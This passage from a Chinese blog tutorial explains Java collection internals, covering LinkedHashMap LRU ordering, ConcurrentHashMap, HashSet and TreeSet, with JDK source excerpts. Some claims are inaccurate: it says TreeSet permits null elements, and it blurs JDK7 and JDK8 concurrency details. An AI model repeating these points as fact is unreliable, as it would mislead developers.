class="function"><span class="keyword">public</span> <span class="title">LinkedHashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity,</span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="keyword">float</span> loadFactor,</span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="keyword">boolean</span> accessOrder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(initialCapacity, loadFactor);</span><br><span class="line">        <span class="keyword">this</span>.accessOrder = accessOrder;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>LinkedHashMap</code>继承自<code>HashMap</code>，与<code>HashMap</code>一样具有快速查找的能力</p>
<p>LinkedHashMap内部较之<code>HashMap</code>额外维护一个<strong>双向链表</strong>，<code>accessOrder</code>用来维护<strong>插入顺序或LRU顺序(最少使用淘汰算法)</strong></p>
<h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><ul>
<li><code>LinkedHashMap</code> 存储结构和 <code>HashMap</code> 相同，依然是数组+链表+红黑树</li>
<li><code>LinkedHashMap</code> 额外持有一个双向链表，维护插入节点的顺序</li>
<li>最终的数据结构如下图<ul>
<li>实际的元素存储与HashMap一致，依然是数组+链表+红黑树的形式</li>
<li>区别在于：<ul>
<li>除了维护数组+链表的结构之外，还根据插入Map先后顺序维护了一个双向链表的头尾head,tail</li>
<li>Node基本结构，相比较HashMap而言，还增加了 before,after 两个分别指向双向链表中前后节点的属性</li>
<li>即下图中的双向链表中的节点，其实值依然是下面的数组+链表结构中的元素</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="https://csn.damyoung.cn/13225554_pJyp.jpg" alt="img"></p>
<h3 id="Entry"><a href="#Entry" class="headerlink" title="Entry"></a>Entry</h3><p>该entry除了保存当前对象的引用，<strong>还保存对上一个对象before和下一个对象after的引用</strong>，是对<code>HashMap.Entry</code>的扩展</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">HashMap</span>.<span class="title">Node</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">    Entry&lt;K,V&gt; before, after;</span><br><span class="line">    Entry(<span class="keyword">int</span> hash, K key, V value, Node&lt;K,V&gt; next) &#123;</span><br><span class="line">        <span class="keyword">super</span>(hash, key, value, next);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="维护顺序"><a href="#维护顺序" class="headerlink" title="维护顺序"></a>维护顺序</h3><blockquote>
<p>插入顺序：accessOrder=false，按照节点插入的顺序</p>
<p>LRU顺序：accessOrder=true，按照最少使用淘汰算法</p>
</blockquote>
<h4 id="HashMap回调"><a href="#HashMap回调" class="headerlink" title="HashMap回调"></a>HashMap回调</h4><p>linkedHashMap继承于HashMap，并没有重写hashMap 的<code>putVal()</code>方法，linkedHashMap在进行元素插入时，会直接调用hashMap的<code>putVal()</code>方法，而在进行维护LRU顺序时，会再次回调<code>linkedHashMap</code>的<code>afterNodeAccess()</code>或 <code>afterNodeInsertion()</code>方法。</p>
<p><img src="https://csn.damyoung.cn/image-20210102103630859.png" alt="HashMap有关LinkedHashMap空方法"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//来自与hashMap的PutVal()</span></span><br><span class="line"><span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">    V oldValue = e.value;</span><br><span class="line">    <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="keyword">null</span>)</span><br><span class="line">        e.value = value;</span><br><span class="line">    <span class="comment">//linkedHashMap</span></span><br><span class="line">    afterNodeAccess(e);</span><br><span class="line">    <span class="keyword">return</span> oldValue;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">++modCount;</span><br><span class="line"><span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">    resize();</span><br><span class="line">	<span class="comment">//linkedHashMap</span></span><br><span class="line">	afterNodeInsertion(evict);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="afterNodeAccess"><a href="#afterNodeAccess" class="headerlink" title="afterNodeAccess"></a>afterNodeAccess</h4><p>当一个节点被<strong>访问</strong>时，如果<code>accessOrder</code> 为true,会将该节点移到链表尾部。也就是说指定为LRU顺序(least Recently Used)之后，在每次访问一个节点时，会将这个节点移动链表尾部，保证链表尾部是最近访问的节点，链表首部就是最近最久未使用的节点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt; e;</span><br><span class="line">    <span class="keyword">if</span> ((e = getNode(hash(key), key)) == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (accessOrder)</span><br><span class="line">        <span class="comment">//accessOrder==true</span></span><br><span class="line">        afterNodeAccess(e);</span><br><span class="line">    <span class="keyword">return</span> e.value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">afterNodeAccess</span><span class="params">(Node&lt;K,V&gt; e)</span> </span>&#123; <span class="comment">// move node to last</span></span><br><span class="line">    LinkedHashMap.Entry&lt;K,V&gt; last;</span><br><span class="line">    <span class="keyword">if</span> (accessOrder &amp;&amp; (last = tail) != e) &#123;</span><br><span class="line">        LinkedHashMap.Entry&lt;K,V&gt; p =</span><br><span class="line">            (LinkedHashMap.Entry&lt;K,V&gt;)e, b = p.before, a = p.after;</span><br><span class="line">        p.after = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">//由于是双向链表</span></span><br><span class="line">        <span class="comment">//前缀，访问节点为头节点，该节点后一个节点代替为head</span></span><br><span class="line">        <span class="keyword">if</span> (b == <span class="keyword">null</span>)</span><br><span class="line">            head = a;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            b.after = a;</span><br><span class="line">        <span class="comment">//后缀，</span></span><br><span class="line">        <span class="keyword">if</span> (a != <span class="keyword">null</span>)</span><br><span class="line">            a.before = b;</span><br><span class="line">        <span class="comment">//访问节点是尾节点</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            last = b;</span><br><span class="line">        <span class="comment">//将访问节点插入尾部</span></span><br><span class="line">        <span class="keyword">if</span> (last == <span class="keyword">null</span>)</span><br><span class="line">            head = p;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            p.before = last;</span><br><span class="line">            last.after = p;</span><br><span class="line">        &#125;</span><br><span class="line">        tail = p;</span><br><span class="line">        ++modCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="afterNodeRemoval"><a href="#afterNodeRemoval" class="headerlink" title="afterNodeRemoval"></a>afterNodeRemoval</h4><p>直接<strong>移除</strong>该节点（unlink）</p>
<blockquote>
<ul>
<li>移除<code>linkedHashMap</code>元素调用了<code>HashMap</code>的<code>removeNode()</code>方法(<code>LinkedHashMap</code>并没有重写该方法)</li>
<li><code>removeNode()</code>回调了<code>LinkedHashMap</code>的<code>afterNodeRemoval</code>方法</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">afterNodeRemoval</span><span class="params">(Node&lt;K,V&gt; e)</span> </span>&#123; <span class="comment">// unlink</span></span><br><span class="line">    LinkedHashMap.Entry&lt;K,V&gt; p =</span><br><span class="line">        (LinkedHashMap.Entry&lt;K,V&gt;)e, b = p.before, a = p.after;</span><br><span class="line">    p.before = p.after = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="keyword">null</span>)</span><br><span class="line">        head = a;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        b.after = a;</span><br><span class="line">    <span class="keyword">if</span> (a == <span class="keyword">null</span>)</span><br><span class="line">        tail = b;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        a.before = b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="afterNodeInsertion"><a href="#afterNodeInsertion" class="headerlink" title="afterNodeInsertion"></a>afterNodeInsertion</h4><p>在<code>put</code>等操作之后执行，当<code>removeEldestEntry()==true</code>时会移除最晚节点，也就是链表首部节点first</p>
<p><code>removeEldestEntry()</code>默认为false，需要继承<code>LinkedHashMap</code>并覆写这个方法的实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">afterNodeInsertion</span><span class="params">(<span class="keyword">boolean</span> evict)</span> </span>&#123; <span class="comment">// possibly remove eldest</span></span><br><span class="line">    LinkedHashMap.Entry&lt;K,V&gt; first;</span><br><span class="line">    <span class="keyword">if</span> (evict &amp;&amp; (first = head) != <span class="keyword">null</span> &amp;&amp; removeEldestEntry(first)) &#123;</span><br><span class="line">        K key = first.key;</span><br><span class="line">        removeNode(hash(key), key, <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在实现 LRU 的缓存中特别有用，通过移除最近最久未使用的节点，从而保证缓存空间足够，并且缓存的数据都是热点数据。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">removeEldestEntry</span><span class="params">(Map.Entry&lt;K,V&gt; eldest)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="使用LinkedHashMap实现LRU缓存"><a href="#使用LinkedHashMap实现LRU缓存" class="headerlink" title="使用LinkedHashMap实现LRU缓存"></a>使用LinkedHashMap实现LRU缓存</h3><ul>
<li>设置最大缓存空间<code>MAX_ENTRIES</code></li>
<li>使用<code>LinkedHashMap</code>的<strong>构造函数</strong>将<code>accessOrder</code>设置为<strong>true</strong>,开启<code>LRU</code>顺序</li>
<li><strong>覆写</strong><code>removeEldestEntry</code>方法，在节点数大于缓存+空间时将最久未使用数据移除</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">LinkedHashMap</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAX_ENTRIES = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//覆写removeEldestEntry() == true</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">removeEldestEntry</span><span class="params">(Map.Entry eldest)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size() &gt; MAX_ENTRIES;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    LRUCache() &#123;</span><br><span class="line">        <span class="keyword">super</span>(MAX_ENTRIES, <span class="number">0.75f</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ConcurrentHashMap"><a href="#ConcurrentHashMap" class="headerlink" title="ConcurrentHashMap"></a>ConcurrentHashMap</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConcurrentHashMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">ConcurrentMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;, <span class="title">Serializable</span> </span>&#123;</span><br></pre></td></tr></table></figure>

<h3 id="可见性"><a href="#可见性" class="headerlink" title="可见性"></a>可见性</h3><p>ConcurrentHashMap的读操作<code>get()</code>并不需要加锁，通过使用<code>volatile</code>关键字Node节点的 <code>val</code>和指针<code>next</code>，在多线程环境下线程A修改因为hash冲突<strong>修改结点的val或者新增节点时</strong>对线程B是可见的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> hash;</span><br><span class="line">    <span class="keyword">final</span> K key;</span><br><span class="line">    <span class="keyword">volatile</span> V val;</span><br><span class="line">    <span class="keyword">volatile</span> Node&lt;K,V&gt; next;</span><br></pre></td></tr></table></figure>

<p>concurrentHashMap在其数组上也用了volatile修饰，其目的是为了使得Node数组在<strong>扩容</strong>时对其他线程具有可见性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">transient</span> <span class="keyword">volatile</span> Node&lt;K,V&gt;[] table;</span><br></pre></td></tr></table></figure>

<h3 id="Null"><a href="#Null" class="headerlink" title="Null"></a>Null</h3><p>进行<code>put()</code>操作时key/value为null时，会抛出<code>NullPointerException</code></p>
<p>如果ConcurrentHashMap中存在一个key对应的value是null，那么当调用map.get(key)的时候，必然会返回null，那么这个null就有两个意思：</p>
<ol>
<li>这个key从来没有再map中映射过，也就是不存在这个key；</li>
<li>这个key是真实存在的，只是在设置key的value值的时候，设置为null了；</li>
</ol>
<p>这个二义性在非线程安全的HashMap中可以通过<code>map.containsKey(key)</code>方法来判断，如果返回true，说明key存在只是对应的value值为空。如果返回false，说明这个key没有再map中映射过。这样是为什么HashMap可以允许键值为null的原因，但是<code>ConcurrentHashMap</code>只用这个判断是判断不了二义性的。</p>
<p><strong>为什么判断二义性？</strong></p>
<p>此时如果有A、B两个线程，A线程调用ConcurrentHashMap.get(key)方法返回null，但是我们不知道这个null是因为key没有再map中映射还是本身存的value值就是null，此时我们假设有一个key没有再map中映射过，也就是map中不存在这个key，此时我们调用ConcurrentHashMap.containsKey(key)方法去做一个判断，我们期望的返回结果是false。但是恰好在A线程get(key)之后，调用constainsKey(key)方法之前B线程执行了ConcurrentHashMap.put(key,null)，那么当A线程执行完containsKey(key)方法之后我们得到的结果是true，与我们预期的结果就不相符了。</p>
<p>至于ConcurrentHashMap中的key为什么也不能为null的问题，ConcurrentHashMap的作者Doug Lea认为map中允许键值为null是一种不合理的设计，HashMap虽然可以判断二义性，但是Doug Lea仍然觉得这样设计是不合理的。</p>
<h3 id="存在缺陷？"><a href="#存在缺陷？" class="headerlink" title="存在缺陷？"></a>存在缺陷？</h3><p>ConcurrentHashMap 是设计为非阻塞的。在更新时会局部锁住某部分数据，但不会把整个表都锁住。同步读取操作则是完全非阻塞的。好处是在保证合理的同步前提下，效率很高。坏处是严格来说读取操作不能保证反映最近的更新。例如线程A调用putAll写入大量数据，期间线程B调用get，则只能get到目前为止已经顺利插入的部分数据。</p>
<h3 id="并发度"><a href="#并发度" class="headerlink" title="并发度"></a>并发度</h3><p>程序在运行时能够同时更新<code>ConcurrentHashMap</code>且不产生锁竞争的最大线程数默认是16，这个值可以在构造函数中设置。</p>
<p>如果自己设置了并发度，<code>ConcurrentHashMap</code>会使用大于等于该值的最小的2的幂指数作为实际并发度，也就是比如你设置的值是17，那么实际并发度是32。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConcurrentHashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity,</span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="keyword">float</span> loadFactor, <span class="keyword">int</span> concurrencyLevel)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(loadFactor &gt; <span class="number">0.0f</span>) || initialCapacity &lt; <span class="number">0</span> || concurrencyLevel &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException();</span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &lt; concurrencyLevel)   <span class="comment">// Use at least as many bins</span></span><br><span class="line">        initialCapacity = concurrencyLevel;   <span class="comment">// as estimated threads</span></span><br><span class="line">    <span class="keyword">long</span> size = (<span class="keyword">long</span>)(<span class="number">1.0</span> + (<span class="keyword">long</span>)initialCapacity / loadFactor);</span><br><span class="line">    <span class="keyword">int</span> cap = (size &gt;= (<span class="keyword">long</span>)MAXIMUM_CAPACITY) ?</span><br><span class="line">        MAXIMUM_CAPACITY : tableSizeFor((<span class="keyword">int</span>)size);</span><br><span class="line">    <span class="keyword">this</span>.sizeCtl = cap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ConcurrentHashMap和HashTable的区别"><a href="#ConcurrentHashMap和HashTable的区别" class="headerlink" title="ConcurrentHashMap和HashTable的区别"></a>ConcurrentHashMap和HashTable的区别</h3><blockquote>
<p>主要体现在实现线程安全方式上不同</p>
</blockquote>
<ul>
<li><strong>底层数据结构</strong></li>
</ul>
<ol>
<li>jdk7 <code>ConcurrentHashMap</code>底层采用<strong>分段数组+链表</strong>实现，jdk8采用 <strong>数组+链表/红黑树</strong>。</li>
<li><code>HashTable</code>采用 <strong>数组+链表</strong></li>
</ol>
<ul>
<li><strong>实现线程安全的方式</strong></li>
</ul>
<ol>
<li><p><code>HashTable</code>采用同一把锁的形式，使用<code>synchronized</code>来保证线程安全，效率非常低。当一个线程访问同步方法时，其他线程也访问同步方法，可能会进入阻塞或轮询状态，如使用<code>put</code>方法添加元素时，不能同时写入，也不能<code>get</code>，竞争越来越激烈</p>
</li>
<li><p>jdk7,<code>concurrentHashMap</code>采用的是<strong>分段锁</strong>的形式对整个桶数组进行了分割分段(segment),每一把锁只锁住容器其中的一部分数据，多线程访问容器中的不同数据段的数据，就不存在锁竞争，提高并发效率。 </p>
<p>jd8之后，摒弃了Segment的概念，而是直接用<strong>Node数组+链表+红黑树</strong>的数据结构来实现，<strong>并发控制使用<code>synchronized</code>和<code>CAS</code>(乐观锁)来操作</strong>，在put()的时候如果CAS失败就说明存在竞争，会进行自旋</p>
</li>
</ol>
<p><strong>两者对比图</strong></p>
<p><code>hashTable</code></p>
<p><img src="http://qiniu.xiaoming.net.cn/HashTable%E5%85%A8%E8%A1%A8%E9%94%81.png" alt="HashTable安全锁"></p>
<p>jdk7的<code>concurrentHashMap</code></p>
<p><img src="http://qiniu.xiaoming.net.cn/1.7%E7%9A%84ConcurrentHashMap.jpeg" alt="1.7ConcurrentHashMap"></p>
<p><code>1.8的ConcurrentHashMap</code></p>
<p><img src="https://camo.githubusercontent.com/b823c5f2cf18e7e27da70409d2b5e18fed820364/68747470733a2f2f6d792d626c6f672d746f2d7573652e6f73732d636e2d6265696a696e672e616c6979756e63732e636f6d2f323031392d362f4a444b312e382d436f6e63757272656e74486173684d61702d5374727563747572652e6a7067" alt="1.8ConcurrentHashMap"></p>
<h3 id="Collections-synchronizedMap-和concurrentHashMap区别"><a href="#Collections-synchronizedMap-和concurrentHashMap区别" class="headerlink" title="Collections.synchronizedMap()和concurrentHashMap区别"></a>Collections.synchronizedMap()和concurrentHashMap区别</h3><p><code>SynchronizedMap</code> 是一个在<code>Collections</code> 工具类中实现了Map接口的代理类通过，创建一个对象锁的形式对Map接口的方法使用synchronized进行保证对Map的操作是线程安全</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SynchronizedMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">Map</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;K,V&gt; m;     <span class="comment">// Backing Map</span></span><br><span class="line">    <span class="keyword">final</span> Object      mutex;        <span class="comment">// Object on which to synchronize</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (mutex) &#123;<span class="keyword">return</span> m.size();&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>区别</strong></p>
<ul>
<li><p><code>Collections.synchronizd</code>和<code>hashTable</code>一样，在调用map所有方法时，会对整个map进行同步，会抛出<code>ConcurrentModificationException</code><strong>异常</strong>；而<code>ConcurrentHashMap</code>实现更加精确，<strong>每个桶都有自己对应的锁</strong>。</p>
<p>所以，只要有一个线程访问 <code>synchronizedMap</code>，其他线程就无法进入 map，而如果一个线程在访问 <code>ConcurrentHashMap</code> 某个桶时，其他线程，仍然可以对 map 执行某些操作。这样，<code>ConcurrentHashMap</code> 在性能以及安全性方面，明显比 <code>Collections.synchronizedMap()</code> 更加有优势。同时，同步操作精确控制到桶，所以，即使在<strong>遍历</strong> <code>ConcurrentHashMap</code> 时，其他线程试图对 <code>ConcurrentHashMap</code> 进行数据修改，也不会抛出 <code>ConcurrentModificationException</code></p>
<p>不论 <code>Collections.synchronizedMap()</code> 还是 <code>ConcurrentHashMap</code> 对 map 同步的原子操作都是作用的 map 的方法上，map 在读取与清空之间，线程间是不同步的。</p>
</li>
<li><p><code>ConcurrentHashMap</code>从类的命名来看，它必然是个 <code>HashMap</code>; 而<code>Collections.synchronizedMap()</code>可以接收<strong>任意Map实例</strong>，实现Map的同步。</p>
</li>
</ul>
<h1 id="set"><a href="#set" class="headerlink" title="set"></a>set</h1><h2 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2><ul>
<li><p>无序不可重复，利用hash算法的<code>hash(key)</code>不可重复的特点</p>
</li>
<li><p>HashSet是基于HashMap实现的，除了<code>clone()</code> <code>writeObjet()</code> <code>readObject()</code>是hashSet自己实现以外，其他都是调用HashMap的方法</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashSet</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">extends</span> <span class="title">AbstractSet</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">Set</span>&lt;<span class="title">E</span>&gt;, <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> HashMap&lt;E,Object&gt; map;</span><br><span class="line">	<span class="comment">//空的Object数组，用来沟通hashMap和hashSet的桥梁</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object PRESENT = <span class="keyword">new</span> Object();</span><br></pre></td></tr></table></figure>

<h3 id="add-3"><a href="#add-3" class="headerlink" title="add"></a>add</h3><p><code>HashSet</code>的<code>add</code>方法实际上是调用了<code>HashMap</code>的<code>put</code>方法，将<code>HashSet</code>的值作为<code>Map</code>中的键存储，利用了<code>HasnMap</code>中<strong>键不能重复的特点</strong>。而在<code>HashMap</code>中，对键的重复检测，首先会计算<code>hashcode</code>值是否相等,如果不相等就加入；如果相等则使用<code>equals()</code>方法检查<code>hashcode</code>相等的对象是否真的相同</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> map.put(e, PRESENT)==<span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><p>hashSet并没有提供<code>get()</code>方法，当需要获取<code>hashSet</code>中某个元素时，只能通过遍历集合的方式进行<code>equals()</code>来比较实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(String str:hashSet)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;hh&quot;</span>.equals(str))&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;匹配到了&quot;</span>+str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h2><ul>
<li><p>TreeSet也是基于<code>TreeMap</code>实现，底层数据结构为红黑树。</p>
</li>
<li><p>与HashSet不同的是，TreeSet具有<strong>排序</strong>功能，分为<strong>自然排序</strong>(123456)和<strong>自定义排序</strong>两类，默认是<strong>自然排序</strong>；在程序中，可以按照任意顺序将元素插入到集合中，等到遍历时TreeSet会按照一定顺序输出–倒序或者升序</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TreeSet(NavigableMap&lt;E,Object&gt; m) &#123;</span><br><span class="line">    <span class="keyword">this</span>.m = m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TreeSet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(<span class="keyword">new</span> TreeMap&lt;E,Object&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="元素搜索"><a href="#元素搜索" class="headerlink" title="元素搜索"></a>元素搜索</h3><p>实现了NavigableSet,Cloneable接口，继承了 AbstractSet抽象类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeSet</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractSet</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">NavigableSet</span>&lt;<span class="title">E</span>&gt;, <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br></pre></td></tr></table></figure>

<ul>
<li>与HashSet同理，继承<code>AbstractSet</code>类(实现了Set接口)，获得Set集合基础实现操作</li>
<li>实现了Cloneable接口，意味它可以被克隆</li>
<li>TreeSet实现<code>NavigaleSet</code>接口，<code>NavigableSet</code>又扩展了<code>SortedSet</code>接口。这俩个接口定义了<strong>元素搜索</strong>的能力</li>
</ul>
<p>ps：给定元素，得到给定元素<strong>大于/小于/等于</strong>的<strong>元素集合</strong>或<strong>元素个数</strong></p>
<h3 id="元素排序"><a href="#元素排序" class="headerlink" title="元素排序"></a>元素排序</h3><p>在TreeSet调用<code>add</code>方法时，会调用到底层<strong>TreeMap</strong>的<code>put</code>方法，在<code>put</code>方法中的树节点put会调用到<code>compare(key, key)</code>方法，进行<code>key</code>大小的比较</p>
<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul>
<li>对插入的元素进行排序，是一个<strong>有序的集合</strong>（主要与HashSet的区别）;</li>
<li>底层使用<strong>红黑树</strong>结构，而不是哈希表结构；</li>
<li>允许插入<strong>Null</strong>值；</li>
<li>不允许插入重复元素；</li>
<li>线程不安全；</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeSetTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] agrs)</span></span>&#123;</span><br><span class="line">        TreeSet&lt;String&gt; treeSet = <span class="keyword">new</span> TreeSet&lt;String&gt;();</span><br><span class="line">        System.out.println(<span class="string">&quot;TreeSet初始化容量大小：&quot;</span>+treeSet.size());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//元素添加：</span></span><br><span class="line">        treeSet.add(<span class="string">&quot;my&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;jiaboyan&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;TreeSet容量大小：&quot;</span> + treeSet.size());</span><br><span class="line">        System.out.println(<span class="string">&quot;TreeSet元素顺序为：&quot;</span> + treeSet.toString());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//增加for循环遍历：</span></span><br><span class="line">        <span class="keyword">for</span>(String str:treeSet)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;遍历元素：&quot;</span>+str);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        